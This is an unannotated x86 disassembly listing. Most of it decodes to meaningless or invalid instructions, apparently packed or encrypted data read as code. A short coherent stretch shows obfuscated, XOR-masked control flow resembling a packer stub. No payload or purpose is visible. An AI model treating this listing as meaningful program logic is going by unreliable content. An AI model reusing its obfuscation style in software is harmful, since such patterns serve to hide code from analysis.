  405a0a:	mov    al,ds:0xffcaa163
  405a0f:	pop    ds
  405a10:	push   ds
  405a11:	mov    dl,0x15
  405a13:	ins    BYTE PTR es:[edi],dx
  405a14:	sti    
  405a15:	push   ebp
  405a16:	dec    eax
  405a17:	call   0xda32:0x42a28723
  405a1e:	sar    ecx,cl
  405a20:	jle    0x4059ff
  405a22:	mov    ah,0x57
  405a24:	rol    ebx,cl
  405a26:	daa    
  405a27:	mov    esp,0x8138acfc
  405a2c:	sub    BYTE PTR [edx+0x778d4b58],al
  405a32:	mov    esp,0x315b6919
  405a37:	jae    0x405aa4
  405a39:	jno    0x405a93
  405a3b:	outs   dx,BYTE PTR ds:[esi]
  405a3c:	fbld   TBYTE PTR [edi+0x36c4978f]
  405a42:	or     DWORD PTR [ecx+0x66],edi
  405a45:	push   ecx
  405a46:	test   eax,0xa5109c75
  405a4b:	pop    esp
  405a4c:	jb     0x405ac0
  405a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a4f:	mov    ch,0x8f
  405a51:	arpl   WORD PTR [edi+edx*1+0x6734b006],dx
  405a58:	enter  0xc28b,0xb5
  405a5c:	pop    ds
  405a5d:	imul   ecx,DWORD PTR [ebp+ebp*2-0x4301ca1e],0x95e2e0dd
  405a68:	jge    0x405acb
  405a6a:	out    0x60,eax
  405a6c:	into   
  405a6d:	or     al,0xcc
  405a6f:	lock lock xor eax,0xc2ebf434
  405a76:	retf   0x4502
  405a79:	xor    ah,BYTE PTR [esi-0x71]
  405a7c:	add    DWORD PTR [edi-0xc],0xfffffff7
  405a80:	adc    eax,0xf450d97c
  405a85:	jmp    0x378c6343
  405a8a:	stos   DWORD PTR es:[edi],eax
  405a8b:	(bad)  
  405a8c:	nop
  405a8d:	sub    eax,0x2147ca28
  405a92:	sub    eax,0xf1a090ec
  405a97:	xor    ebp,DWORD PTR [edi+0x71]
  405a9a:	imul   esi,ebx,0xe
  405a9d:	jmp    0x764bb4fd
  405aa2:	repnz push edx
  405aa4:	xor    eax,0xdb59d9c
  405aa9:	je     0x405a40
  405aab:	mov    ch,0x4
  405aad:	lds    ebx,FWORD PTR [ebx-0x7d]
  405ab0:	and    ecx,0x5d
  405ab3:	mov    BYTE PTR [esi-0x774da7b9],ch
  405ab9:	inc    eax
  405aba:	jnp    0x405ad5
  405abc:	fistp  DWORD PTR [edi]
  405abe:	lods   eax,DWORD PTR ds:[esi]
  405abf:	test   eax,0x6dc76477
  405ac4:	rcr    BYTE PTR [ebx],0x10
  405ac7:	jno    0x405a99
  405ac9:	ficomp WORD PTR [edi+0x75]
  405acc:	cmp    cl,ch
  405ace:	mov    bh,0xe9
  405ad0:	fldcw  WORD PTR [edx]
  405ad2:	int    0x96
  405ad4:	jecxz  0x405a7f
  405ad6:	mov    DWORD PTR [edx],ebp
  405ad8:	pop    ds
  405ad9:	sbb    esp,DWORD PTR [ebx+0x22]
  405adc:	int3   
  405add:	jbe    0x405a60
  405adf:	push   ebp
  405ae0:	adc    eax,0x7319a014
  405ae5:	cs xchg edi,eax
  405ae7:	ja     0x405aff
  405ae9:	xchg   ecx,eax
  405aea:	cmp    BYTE PTR [edi-0x445243fe],dh
  405af0:	cmp    cl,0x0
  405af3:	adc    esi,eax
  405af5:	add    al,0x20
  405af7:	cmp    eax,0x5638828d
  405afc:	js     0x405af2
  405afe:	dec    ebp
  405aff:	pop    esi
  405b00:	retf   
  405b01:	mov    esi,DWORD PTR gs:[ebx]
  405b04:	push   esi
  405b05:	push   0xf9142e52
  405b0a:	out    0x72,al
  405b0c:	out    dx,eax
  405b0d:	les    esi,FWORD PTR [eax+ebx*1-0x3e]
  405b11:	sar    ch,1
  405b13:	cmc    
  405b14:	jmp    0x405b66
  405b16:	fistp  DWORD PTR [esp+ebp*2]
  405b19:	jg     0x405b08
  405b1b:	pusha  
  405b1c:	and    BYTE PTR [ebp+eiz*8-0x108f2e34],ah
  405b23:	jp     0x405b64
  405b25:	mov    bl,0x8d
  405b27:	inc    edi
  405b28:	push   eax
  405b29:	add    al,0x6c
  405b2b:	pop    ebp
  405b2c:	(bad)  
  405b2e:	in     al,0x14
  405b30:	or     DWORD PTR [ecx+ecx*4],esi
  405b33:	dec    ebp
  405b34:	adc    BYTE PTR [ecx+0xc6d],bh
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43369b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433653,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4336a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4336ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43372f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x6afea724
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c55
  405be0:	mov    dl,0x4c
  405be2:	add    ah,BYTE PTR [ecx]
  405be4:	outs   dx,BYTE PTR ds:[esi]
  405be5:	outs   dx,DWORD PTR ds:[esi]
  405be6:	sub    edi,DWORD PTR [edi+0x4f7747e8]
  405bec:	bound  ebp,QWORD PTR [esp+edi*8+0x4cc0299e]
  405bf3:	or     dh,dl
  405bf5:	mov    bh,0x59
  405bf7:	add    bl,BYTE PTR [ecx+0x2d]
  405bfa:	push   ds
  405bfb:	ins    DWORD PTR es:[edi],dx
  405bfc:	fucomip st,st(6)
  405bfe:	dec    ecx
  405bff:	aaa    
  405c00:	leave  
  405c01:	scas   al,BYTE PTR es:[edi]
  405c02:	mov    dl,0xe3
  405c04:	jmp    0x405be3
  405c06:	xchg   DWORD PTR [edx+ebp*4],edx
  405c09:	push   ecx
  405c0a:	mov    ebp,0x2ccba803
  405c0f:	cld    
  405c10:	or     BYTE PTR [eax+0x2c],bl
  405c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c14:	push   esi
  405c16:	xor    DWORD PTR [eax],ebp
  405c18:	rcl    DWORD PTR gs:[edi],cl
  405c1b:	and    al,0xc4
  405c1d:	cmp    al,0x47
  405c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c20:	repz mov ds:0x6d792cbb,al
  405c26:	mov    WORD PTR gs:[ecx-0xf0bf18e],gs
  405c2d:	inc    ecx
  405c2e:	xchg   edx,eax
  405c2f:	(bad)  
  405c30:	fistp  WORD PTR [edi-0x9]
  405c33:	int3   
  405c34:	pop    esp
  405c35:	push   cs
  405c36:	call   0xcf39:0x3ae15aa4
  405c3d:	retf   0x478b
  405c40:	sbb    eax,0x6cde4394
  405c45:	(bad)  
  405c47:	inc    ebx
  405c48:	push   edx
  405c49:	dec    DWORD PTR [ecx-0x58]
  405c4c:	push   cs
  405c4d:	icebp  
  405c4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c4f:	pushf  
  405c50:	lea    edx,[eax-0x7d1200c4]
  405c56:	adc    BYTE PTR ds:0x20c6089e,0x49
  405c5d:	popa   
  405c5e:	xor    edx,DWORD PTR [edx-0x1b]
  405c61:	js     0x405c94
  405c63:	cwde   
  405c64:	xchg   esp,eax
  405c65:	cmp    dl,BYTE PTR [esi+0x6e20aab0]
  405c6b:	inc    ecx
  405c6c:	sub    BYTE PTR [ecx],ch
  405c6e:	ja     0x405c76
  405c70:	pminub mm3,QWORD PTR [ebx-0x54280838]
  405c77:	in     eax,dx
  405c78:	std    
  405c79:	(bad)  
  405c7a:	(bad)  
  405c7b:	pop    esp
  405c7c:	push   0x72
  405c7e:	mov    BYTE PTR [ecx+0x2d],ch
  405c81:	pop    es
  405c82:	sbb    DWORD PTR [edx],esi
  405c84:	jo     0x405cc6
  405c86:	dec    eax
  405c87:	adc    DWORD PTR [ecx+0x16],ebp
  405c8a:	es je  0x405c7e
  405c8d:	pop    ecx
  405c8e:	pop    ecx
  405c8f:	into   
  405c90:	rcl    DWORD PTR [ebx-0x3f],1
  405c93:	loop   0x405ce5
  405c95:	push   ecx
  405c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c97:	push   cs
  405c98:	dec    edi
  405c99:	push   0x17413ca0
  405c9e:	jle    0x405c54
  405ca0:	or     eax,0xe11ac761
  405ca5:	pop    es
  405ca6:	push   ss
  405ca7:	fdivr  st,st(0)
  405ca9:	mov    edi,0xd2bb877a
  405cae:	fsubrp st(3),st
  405cb0:	mov    eax,0x9bf8f1c8
  405cb5:	(bad)  
  405cb6:	xor    DWORD PTR [esi-0x33],ebx
  405cb9:	mov    cl,0x38
  405cbb:	mov    al,0xdb
  405cbd:	sub    al,0xda
  405cbf:	pop    esi
  405cc0:	push   esi
  405cc1:	in     eax,dx
  405cc2:	adc    ecx,ecx
  405cc4:	(bad)  
  405cc6:	mov    WORD PTR [ebx],fs
  405cc8:	mov    bl,0x10
  405cca:	dec    esi
  405ccb:	mov    eax,ds:0x56ca42d3
  405cd0:	inc    esp
  405cd1:	xchg   esi,eax
  405cd2:	pop    esi
  405cd3:	loopne 0x405c8d
  405cd5:	adc    bh,BYTE PTR [ecx+0x17369c17]
  405cdb:	and    BYTE PTR [ebp+eax*4+0x6a705975],dh
  405ce2:	mov    edi,0xf8a2fbdb
  405ce7:	adc    BYTE PTR [ecx+0x7b1f9090],dh
  405ced:	xchg   DWORD PTR [edi+edi*4+0x6f682e39],ebp
  405cf4:	and    eax,0x1a1610a8
  405cf9:	(bad)  
  405cfa:	sti    
  405cfb:	(bad)  
  405cfc:	jo     0x405d3c
  405cfe:	ret    
  405cff:	mov    esp,0x3c1163d5
  405d04:	mov    eax,ds:0x1147fa88
  405d09:	ficom  WORD PTR [ebx]
  405d0b:	in     eax,0xd3
  405d0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d0e:	jae    0x405d4b
  405d10:	scas   eax,DWORD PTR es:[edi]
  405d11:	(bad)  
  405d12:	fild   QWORD PTR [ecx+0x68ed828f]
  405d18:	popa   
  405d19:	adc    eax,0xc3b6fa7f
  405d1e:	xor    al,0x7d
  405d20:	jmp    0x405d80
  405d22:	sbb    DWORD PTR [esi-0x5c],ebx
  405d25:	pop    edi
  405d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d27:	xchg   edi,eax
  405d28:	dec    eax
  405d29:	clc    
  405d2a:	inc    edi
  405d2b:	pop    edx
  405d2c:	inc    edi
  405d2d:	add    BYTE PTR [ebp-0x2abce86a],cl
  405d33:	stc    
  405d34:	add    bh,dh
  405d36:	pop    ecx
  405d37:	repz pop edi
  405d39:	scas   al,BYTE PTR es:[edi]
  405d3a:	adc    bl,BYTE PTR [esi-0x29f06e52]
  405d40:	adc    BYTE PTR [edi+0x46],0x2
  405d44:	icebp  
  405d45:	ror    cl,cl
  405d47:	sti    
  405d48:	int    0xc1
  405d4a:	outs   dx,DWORD PTR ds:[esi]
  405d4b:	fsub   QWORD PTR [eax+eax*4-0x379bfd1]
  405d52:	js     0x405d9a
  405d54:	fdivr  st,st(2)
  405d56:	adc    BYTE PTR [eax-0x28],bl
  405d59:	inc    ebx
  405d5a:	push   eax
  405d5b:	inc    edx
  405d5c:	into   
  405d5d:	imul   esi,DWORD PTR [esi-0x11c1b3ab],0x8730a93
  405d67:	nop
  405d68:	rcr    BYTE PTR [esi],0xc8
  405d6b:	push   ecx
  405d6c:	js     0x405d30
  405d6e:	mov    ch,0x40
  405d70:	adc    cl,dl
  405d72:	gs inc edi
  405d74:	inc    eax
  405d75:	lds    esi,FWORD PTR ds:0xfc3d71f0
  405d7b:	lock mov ah,0xc3
  405d7e:	(bad)  
  405d7f:	test   al,0x40
  405d81:	imul   DWORD PTR [esi]
  405d83:	out    0x50,al
  405d85:	adc    al,0x74
  405d87:	mov    eax,DWORD PTR [eax+0x57]
  405d8a:	adc    al,0x29
  405d8c:	inc    esp
  405d8d:	ret    
  405d8e:	mov    edx,0x69ef6a06
  405d93:	xor    eax,0x95bbbcb9
  405d98:	sbb    DWORD PTR [edx-0x7dfa2d9e],ebp
  405d9e:	cmp    bl,BYTE PTR [eax+0x23]
  405da1:	daa    
  405da2:	aas    
  405da3:	call   0xb79f83e6
  405da8:	push   edi
  405da9:	enter  0xdf1,0x8
  405dad:	xchg   esp,eax
  405dae:	fmul   QWORD PTR [edi]
  405db0:	push   ss
  405db1:	sub    eax,0x73479187
  405db6:	js     0x405d4f
  405db8:	div    esp
  405dba:	nop
  405dbb:	jae    0x405e1f
  405dbd:	sub    eax,0x93511e7c
  405dc2:	push   esi
  405dc3:	xchg   ebx,eax
  405dc4:	mov    ah,0x1c
  405dc6:	inc    esp
  405dc7:	retf   
  405dc8:	push   ebp
  405dc9:	scas   eax,DWORD PTR es:[edi]
  405dca:	jg     0x405d60
  405dcc:	dec    eax
  405dcd:	mov    ch,0xee
  405dcf:	jge    0x405dc1
  405dd1:	and    al,0xae
  405dd3:	jnp    0x405e3d
  405dd5:	sbb    eax,0xf94402a8
  405dda:	cmp    DWORD PTR [edi+0xc6d924d],ebp
  405de0:	sub    eax,0x46c15f76
  405de5:	popa   
  405de6:	mov    dh,0xba
  405de8:	fisttp DWORD PTR [ebx-0x5838710b]
  405dee:	pop    ss
  405def:	lods   al,BYTE PTR ds:[esi]
  405df0:	sub    eax,0x131e3daa
  405df5:	xlat   BYTE PTR ds:[ebx]
  405df6:	test   esp,ecx
  405df8:	imul   edi,DWORD PTR [esi+eiz*4-0x5d923827],0x451ca7c4
  405e03:	and    ch,BYTE PTR [ebp+0x5a]
  405e06:	data16 das 
  405e08:	call   0xf507:0x8252d982
  405e0f:	cmp    esp,ebp
  405e11:	(bad)  
  405e12:	xchg   ebp,eax
  405e13:	pop    edx
  405e14:	fst    st(3)
  405e16:	sub    DWORD PTR [esi+0x4b],ebx
  405e19:	icebp  
  405e1a:	xor    eax,0xe4c3ba96
  405e1f:	cdq    
  405e20:	xchg   edi,eax
  405e21:	jbe    0x405e50
  405e23:	adc    BYTE PTR [edx],0x60
  405e26:	std    
  405e27:	add    DWORD PTR [edx+0x55f34ffc],ebp
  405e2d:	push   ecx
  405e2e:	js     0x405e32
  405e30:	sbb    DWORD PTR [esi+0x71bc9702],edx
  405e36:	dec    edi
  405e37:	sti    
  405e38:	mov    ds,WORD PTR [ebx-0x89a496b]
  405e3e:	mov    bl,0x41
  405e40:	repz mov ebx,0x347c7c95
  405e46:	ins    DWORD PTR es:[edi],dx
  405e47:	inc    ecx
  405e48:	inc    ebx
  405e49:	mov    eax,ds:0xd7b3d983
  405e4e:	rcl    BYTE PTR [edx],1
  405e50:	xor    eax,0x4f70bec3
  405e55:	add    al,0x93
  405e57:	ror    edx,0x21
  405e5a:	mov    bh,0xff
  405e5c:	mov    ch,0x62
  405e5e:	mov    ?,WORD PTR [ecx-0x3eeff434]
  405e64:	enter  0xd47f,0x83
  405e68:	or     al,0x12
  405e6a:	jne    0x405ee9
  405e6c:	xchg   DWORD PTR ds:0xaa0b08cd,edx
  405e72:	mov    eax,0x15724dcc
  405e77:	lock stos DWORD PTR es:[edi],eax
  405e79:	xchg   esp,eax
  405e7a:	je     0x405ebb
  405e7c:	cmc    
  405e7d:	ins    DWORD PTR es:[edi],dx
  405e7e:	jae    0x405e4b
  405e80:	adc    BYTE PTR [eax-0x32],0x9e
  405e84:	jns    0x405ee7
  405e86:	push   eax
  405e87:	test   ecx,esp
  405e89:	adc    al,0xd
  405e8b:	inc    edi
  405e8c:	and    BYTE PTR [ecx+0x3cd2c802],0x39
  405e93:	rol    BYTE PTR [ebp-0x47],0xb4
  405e97:	lea    esi,[ebx+0x65]
  405e9a:	sub    BYTE PTR [ebp+0x60898758],dh
  405ea0:	pusha  
  405ea1:	cmp    ebx,DWORD PTR ds:0x513a0e3a
  405ea7:	sbb    BYTE PTR [ecx+0x7657bc48],bl
  405ead:	fwait
  405eae:	sbb    al,0x3d
  405eb0:	lods   eax,DWORD PTR ds:[esi]
  405eb1:	dec    esi
  405eb2:	sub    eax,0x503c52a
  405eb7:	xor    BYTE PTR [edi+0x430d16e1],cl
  405ebd:	gs jge 0x405f00
  405ec0:	retf   
  405ec1:	mov    al,0x80
  405ec3:	inc    esp
  405ec4:	mov    WORD PTR [edx],?
  405ec6:	daa    
  405ec7:	stos   DWORD PTR es:[edi],eax
  405ec8:	int3   
  405ec9:	mov    cl,0xbe
  405ecb:	adc    al,0xf9
  405ecd:	pop    ebp
  405ece:	mov    ds:0xad90c750,eax
  405ed3:	aas    
  405ed4:	mov    eax,ds:0xbf8f7f41
  405ed9:	out    0xdb,al
  405edb:	add    DWORD PTR [edi-0x5c],0x4f761071
  405ee2:	shl    DWORD PTR [esp+eax*2+0x5c3630ff],1
  405ee9:	add    eax,0xfb4f9b02
  405eee:	test   DWORD PTR [edi-0x268ca89f],esi
  405ef4:	ret    
  405ef5:	sub    eax,DWORD PTR [ecx]
  405ef7:	cmc    
  405ef8:	aam    0x3f
  405efa:	dec    edx
  405efb:	test   DWORD PTR [esi-0x1fbf8d65],0x34b5a979
  405f05:	jb     0x405f32
  405f07:	mov    bh,0xd6
  405f09:	and    esp,DWORD PTR [eax-0x44b2234e]
  405f0f:	sti    
  405f10:	add    eax,0xd9f7f133
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [edx],es
  405f27:	and    bh,BYTE PTR [eax+0x7e30a6ea]
  405f2d:	jle    0x405f5b
  405f2f:	jge    0x405faf
  405f31:	jle    0x405f54
  405f33:	fmulp  st(4),st
  405f35:	pop    ss
  405f36:	mov    fs,WORD PTR [ecx+0x2ae02bab]
  405f3c:	(bad)  
  405f3e:	stos   BYTE PTR es:[edi],al
  405f3f:	jmp    0x6c32:0xf7b548b0
  405f46:	aas    
  405f47:	ins    DWORD PTR es:[edi],dx
  405f48:	or     ch,BYTE PTR [edx]
  405f4a:	pop    edx
  405f4b:	mov    esp,0xacd12f8a
  405f50:	rcl    dh,0x66
  405f53:	gs jmp 0xa16bc304
  405f59:	mov    ch,0x44
  405f5b:	cwde   
  405f5c:	cmp    DWORD PTR [esi+0x442238c4],edi
  405f62:	push   esi
  405f63:	dec    edi
  405f64:	xor    DWORD PTR [ebp+0x63],ecx
  405f67:	push   es
  405f68:	xchg   DWORD PTR [eax+0x58b9483],eax
  405f6e:	sbb    al,0x31
  405f70:	rcl    DWORD PTR [edx+0xe],0x21
  405f74:	mov    bl,0x66
  405f76:	icebp  
  405f77:	out    dx,eax
  405f78:	xor    dl,cl
  405f7a:	jbe    0x405f1b
  405f7c:	lahf   
  405f7d:	add    cl,BYTE PTR [edx-0x7d]
  405f80:	dec    ebx
  405f81:	push   es
  405f82:	jge    0x405fe6
  405f84:	dec    ebp
  405f85:	pop    ecx
  405f86:	push   ecx
  405f87:	mov    edi,0x3d24a1b9
  405f8c:	mov    DWORD PTR [ecx-0x3df29972],edi
  405f92:	cld    
  405f93:	stos   DWORD PTR es:[edi],eax
  405f94:	push   cs
  405f95:	cmp    ah,cl
  405f97:	addr16 hlt 
  405f99:	push   cs
  405f9a:	sbb    DWORD PTR [ecx+0x5f9e68e2],esp
  405fa0:	popa   
  405fa1:	cmc    
  405fa2:	or     ecx,DWORD PTR [eax+eax*1+0x385a3cb7]
  405fa9:	iret   
  405faa:	cmc    
  405fab:	push   edx
  405fac:	push   es
  405fad:	mov    ah,0x78
  405faf:	inc    eax
  405fb0:	dec    edx
  405fb1:	js     0x405f58
  405fb3:	pop    esi
  405fb4:	mov    eax,ds:0x3b80a0ce
  405fb9:	or     ecx,ebp
  405fbb:	jae    0x405f60
  405fbd:	inc    ecx
  405fbe:	popf   
  405fbf:	mov    ah,0xc1
  405fc1:	icebp  
  405fc2:	out    dx,al
  405fc3:	mov    WORD PTR [edx-0x163795c9],ss
  405fc9:	ret    
  405fca:	out    0x5d,eax
  405fcc:	pop    esi
  405fcd:	push   edx
  405fce:	mov    ds:0xe1b74800,eax
  405fd3:	outs   dx,BYTE PTR ds:[esi]
  405fd4:	push   ds
  405fd5:	mov    cl,BYTE PTR [ebp+0x52bb446a]
  405fdb:	in     al,0x1
  405fdd:	das    
  405fde:	pop    ss
  405fdf:	mov    al,0x1d
  405fe1:	sub    bl,BYTE PTR [ebp+eiz*2-0x15662ef7]
  405fe8:	mov    cl,BYTE PTR [edi-0x7309cff1]
  405fee:	stos   BYTE PTR es:[edi],al
  405fef:	out    dx,al
  405ff0:	xor    eax,DWORD PTR [esi-0x70]
  405ff3:	jmp    0x406035
  405ff5:	stc    
  405ff6:	clc    
  405ff7:	or     eax,0xa55fea7c
  405ffc:	xor    cl,0x1f
  405fff:	ret    0x8428
  406002:	iret   
  406003:	pop    ebx
  406004:	lds    edx,FWORD PTR [edi]
  406006:	pop    ds
  406007:	sub    bl,BYTE PTR [ecx-0x48453c63]
  40600d:	adc    al,0xc
  40600f:	aam    0xc7
  406011:	or     eax,edx
  406013:	pop    esi
  406014:	push   edi
  406015:	inc    eax
  406016:	push   0x20
  406018:	data16 (bad) 
  40601a:	mov    bl,BYTE PTR [edx]
  40601c:	and    BYTE PTR [ecx-0x6c],0x74
  406020:	repnz adc bl,BYTE PTR [esi+0x2a]
  406024:	push   ebx
  406025:	or     ch,BYTE PTR [edx+edx*8]
  406028:	mov    ecx,0x918797
  40602d:	gs retf 
  40602f:	sub    al,BYTE PTR [ecx+0x61aa348a]
  406035:	es inc edx
  406037:	jg     0x40606b
  406039:	stos   BYTE PTR es:[edi],al
  40603a:	enter  0x16fd,0x89
  40603e:	daa    
  40603f:	push   0xffffff87
  406041:	retf   
  406042:	popf   
  406043:	jmp    0xbd929434
  406048:	xor    eax,0x604a6f7f
  40604d:	add    edx,DWORD PTR [eax+eiz*4+0x43]
  406051:	add    eax,0x4f159c15
  406056:	test   bh,al
  406058:	cli    
  406059:	mov    ecx,DWORD PTR [eiz*4+0x676d2692]
  406060:	add    edi,ecx
  406062:	mov    eax,ds:0x293aaa70
  406067:	pop    edi
  406068:	jo     0x405fef
  40606a:	das    
  40606b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40606c:	out    0xd,eax
  40606e:	aad    0xe1
  406070:	and    esi,DWORD PTR [edx-0x4b]
  406073:	cwde   
  406074:	xor    edx,DWORD PTR [edi-0xc]
  406077:	add    al,0xf5
  406079:	push   ss
  40607a:	inc    edi
  40607b:	sub    DWORD PTR [ebx+0x35],edi
  40607e:	rcr    BYTE PTR [ebx+edi*4],cl
  406081:	xchg   esp,eax
  406082:	push   ecx
  406083:	mov    WORD PTR [ecx],?
  406085:	adc    ebx,DWORD PTR [edx]
  406087:	in     al,dx
  406088:	inc    esp
  406089:	sbb    bl,dl
  40608b:	adc    al,0x23
  40608d:	fidivr WORD PTR [ecx]
  40608f:	xchg   esp,eax
  406090:	sbb    al,0x4d
  406092:	inc    ecx
  406093:	cmp    BYTE PTR [esi-0x29],bl
  406096:	inc    esi
  406097:	lods   al,BYTE PTR ds:[esi]
  406098:	mov    eax,0xdfbe5612
  40609d:	je     0x406059
  40609f:	adc    esp,esp
  4060a1:	dec    ecx
  4060a2:	rol    DWORD PTR [ecx-0x2d],cl
  4060a5:	rcr    DWORD PTR ds:0x836f5be8,0x1d
  4060ac:	repnz ss (bad) 
  4060af:	aaa    
  4060b0:	(bad)  
  4060b1:	xor    bl,BYTE PTR [eax+ecx*4+0x18b48ded]
  4060b8:	popf   
  4060b9:	icebp  
  4060ba:	pop    esi
  4060bb:	cmp    al,0x49
  4060bd:	lods   eax,DWORD PTR ds:[esi]
  4060be:	call   0xfac23d1b
  4060c3:	in     eax,dx
  4060c4:	or     DWORD PTR [edx+0x76],0xfe458eec
  4060cb:	fnstenv [edi+0x2765cc1a]
  4060d1:	dec    esi
  4060d2:	fcomp  QWORD PTR [ebx+0x38]
  4060d5:	or     edx,DWORD PTR [edi+0x10]
  4060d8:	mov    al,0xc6
  4060da:	pop    eax
  4060db:	sbb    al,0x5c
  4060dd:	sbb    al,0xda
  4060df:	stos   DWORD PTR es:[edi],eax
  4060e0:	imul   ebp,DWORD PTR [eax+eiz*2],0xffffffc7
  4060e4:	mov    eax,0x353414bc
  4060e9:	mov    edi,0x4243df3e
  4060ee:	add    esp,ebp
  4060f0:	int3   
  4060f1:	jg     0x406088
  4060f3:	rcr    DWORD PTR [ebx+0x12],1
  4060f6:	push   ss
  4060f7:	jbe    0x4060d8
  4060f9:	xchg   esp,eax
  4060fa:	lahf   
  4060fb:	pop    ebp
  4060fc:	mov    edx,0x39dc588c
  406101:	ja     0x40613d
  406103:	push   0x42
  406105:	mov    esp,0xc912e291
  40610a:	add    eax,0x818c52c1
  40610f:	mov    esi,0xfb142416
  406114:	clc    
  406115:	push   ebx
  406116:	addr16 dec esi
  406118:	inc    ebx
  406119:	mov    ah,0x8c
  40611b:	xor    al,0x78
  40611d:	dec    esp
  40611e:	mov    eax,ds:0xd00c2702
  406123:	sub    ch,bh
  406125:	call   0xb55ca97c
  40612a:	sbb    eax,0xcb6efe09
  40612f:	mov    ebx,DWORD PTR [eax+0x19]
  406132:	out    0xee,al
  406134:	aam    0x37
  406136:	cmp    BYTE PTR [edx],ch
  406138:	dec    edx
  406139:	cmc    
  40613a:	popa   
  40613b:	gs scas al,BYTE PTR es:[edi]
  40613d:	call   0xe0783c8c
  406142:	inc    edi
  406143:	imul   esp,edi,0xffffffcc
  406146:	clc    
  406147:	mov    DWORD PTR [ebp-0x5f5317b0],edx
  40614d:	adc    al,0x12
  40614f:	out    0x27,al
  406151:	add    al,0xdc
  406153:	aaa    
  406154:	mov    bl,0x62
  406156:	lahf   
  406157:	sub    BYTE PTR [ecx+0x68],ch
  40615a:	fdiv   DWORD PTR [ecx+0x74]
  40615d:	fsub   st(6),st
  40615f:	mov    edi,0xd76010c3
  406164:	mov    ds:0xa7d18344,al
  406169:	(bad)
  40616d:	push   ds
  40616e:	or     al,0x40
  406170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406171:	call   0x23c0:0xfe64badb
  406178:	sbb    al,0x7a
  40617a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40617b:	adc    BYTE PTR [ecx-0x1792064f],al
  406181:	fnstcw WORD PTR [esi+ebx*4]
  406184:	leave  
  406185:	and    DWORD PTR [ecx+0xf],edi
  406188:	xchg   ebx,eax
  406189:	lods   eax,DWORD PTR ds:[esi]
  40618a:	fisttp WORD PTR [edi+0x3d7cc2f]
  406190:	ds aam 0xf5
  406193:	add    al,0x39
  406195:	loope  0x406154
  406197:	ror    DWORD PTR [ecx-0x6d],0x94
  40619b:	dec    edx
  40619c:	sbb    al,0x15
  40619e:	imul   ebx,ecx,0xd5c300ed
  4061a4:	pop    esi
  4061a5:	mov    eax,ds:0xd5ed0ff2
  4061aa:	xlat   BYTE PTR ds:[ebx]
  4061ab:	pop    esi
  4061ac:	sbb    bh,BYTE PTR [ebp+0x40]
  4061af:	sbb    ecx,0xffffffa0
  4061b2:	sub    eax,0x8590558
  4061b7:	popa   
  4061b8:	in     al,0x1f
  4061ba:	dec    edi
  4061bb:	adc    DWORD PTR [esi+0x2fa76879],edx
  4061c1:	call   0xa2d8:0x41cf2d11
  4061c8:	mov    cl,0x2f
  4061ca:	loope  0x406223
  4061cc:	cmp    ch,cl
  4061ce:	iret   
  4061cf:	dec    ecx
  4061d0:	sti    
  4061d1:	ja     0x40615e
  4061d3:	sar    DWORD PTR [ebp+0x61],1
  4061d6:	fcomp  DWORD PTR [ebp+0x1f75693]
  4061dc:	or     al,0xa2
  4061de:	cld    
  4061df:	sbb    al,0x29
  4061e1:	mov    WORD PTR [esi-0x32],ds
  4061e4:	hlt    
  4061e5:	xor    eax,0x74d7c61b
  4061ea:	push   ebx
  4061eb:	loop   0x40625e
  4061ed:	ret    0x8c30
  4061f0:	test   bl,ch
  4061f2:	xchg   DWORD PTR [esi-0x6],eax
  4061f5:	push   ebp
  4061f6:	pop    esi
  4061f7:	addr16 push ebp
  4061f9:	ret    0xff08
  4061fc:	loopne 0x40620c
  4061fe:	xchg   edi,eax
  4061ff:	sti    
  406200:	shr    DWORD PTR [eax+0x1e],0x72
  406204:	ins    DWORD PTR es:[edi],dx
  406205:	mov    ebp,0x597d9bdd
  40620a:	xor    DWORD PTR [ecx-0x20],edi
  40620d:	scas   al,BYTE PTR es:[edi]
  40620e:	gs xor al,0x9
  406211:	jmp    0xbb8:0xac371a13
  406218:	adc    BYTE PTR [eax],dl
  40621a:	test   al,0x41
  40621c:	imul   ebp,ebx,0xdbf888aa
  406222:	call   0x98c6:0x28d11691
  406229:	push   0xffffffad
  40622b:	pop    edx
